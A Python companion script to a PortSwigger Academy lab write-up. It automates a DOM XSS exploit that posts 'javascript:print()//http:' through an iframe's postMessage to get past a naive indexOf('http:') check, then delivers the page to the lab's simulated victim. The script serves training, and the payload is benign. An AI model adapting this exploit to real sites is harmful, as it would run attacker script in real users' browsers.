#!/usr/bin/env python3
"""
DOM XSS using web messages and a JavaScript URL
PortSwigger Web Security Academy -- DOM-Based Vulnerabilities

Companion script for the writeup: 02-dom-xss-web-messages-javascript-url.md

What this does:
    Confirms the home page's message handler assigns the incoming data to
    `location.href` after a naive `indexOf('http:')` substring check, then
    builds an exploit page that posts `javascript:print()//http:` -- the
    `//http:` tail is a JavaScript comment that satisfies the substring check
    without changing what the URL actually does when evaluated. Delivered
    through the exploit server exactly like the previous lab; the payload
    only executes once PortSwigger's own victim browser renders the delivered
    page, so the solve is confirmed by polling the lab's home page afterwards.

Usage:
    python 02-dom-xss-web-messages-javascript-url.py <lab-url>
    e.g. python 02-dom-xss-web-messages-javascript-url.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import time
import httpx

SOURCE_PATTERN = r"addEventListener\s*\(\s*['\"]message['\"]"
SINK_PATTERNS = [r"location\s*=", r"location\.href\s*=", r"location\.assign\s*\(", r"location\.replace\s*\("]


def detect_dom_sinks(client, lab_url):
    r = client.get(lab_url)
    scripts = re.findall(r"<script[^>]*>(.*?)</script>", r.text, re.DOTALL | re.IGNORECASE)
    all_js = "\n".join(scripts)
    has_listener = bool(re.search(SOURCE_PATTERN, all_js, re.IGNORECASE))
    sinks = [p for p in SINK_PATTERNS if re.search(p, all_js, re.IGNORECASE)]
    return has_listener, sinks


def get_exploit_server_url(client, lab_url):
    r = client.get(lab_url)
    m = re.search(r'(https://exploit-[^\s"\'<>]+\.exploit-server\.net)', r.text)
    return m.group(1).rstrip("/") if m else None


def exploit_server_deliver(exploit_url, body_html):
    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    with httpx.Client(follow_redirects=True, timeout=15) as c:
        c.post(exploit_url, data={
            "urlIsHttps": "on", "responseFile": "/exploit", "responseHead": headers,
            "responseBody": body_html, "formAction": "STORE",
        })
        c.post(exploit_url, data={
            "urlIsHttps": "on", "responseFile": "/exploit", "responseHead": headers,
            "responseBody": body_html, "formAction": "DELIVER_TO_VICTIM",
        })


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    exploit_url = get_exploit_server_url(client, lab_url)
    if not exploit_url:
        print("[-] Could not find this lab's exploit server URL on the home page.")
        return
    print(f"[*] Exploit server: {exploit_url}")

    has_listener, sinks = detect_dom_sinks(client, lab_url)
    print(f"[*] Message listener present: {has_listener}")
    print(f"[*] Sinks found: {sinks}")

    # craft_web_message_js_url() -- javascript:CODE//BYPASS_CHECK, so indexOf('http:')
    # still finds the substring but the value is a javascript: URL, not a real one.
    js_code = "print()"
    bypass_check = "http:"
    payload = f"javascript:{js_code}//{bypass_check}"
    exploit_html = (
        f'<iframe src="{lab_url}/" '
        f"onload=\"this.contentWindow.postMessage('{payload}','*')\">"
        f"</iframe>"
    )
    print(f"[*] Exploit page:\n{exploit_html}")

    exploit_server_deliver(exploit_url, exploit_html)
    print("[*] Exploit stored and delivered to victim.")

    time.sleep(5)
    check = client.get(lab_url)
    if "congratulations" in check.text.lower():
        print("[+] Lab solved -- javascript: URL bypassed the indexOf('http:') check.")
    else:
        print("[-] Not solved yet -- give the victim browser a few more seconds and re-check.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
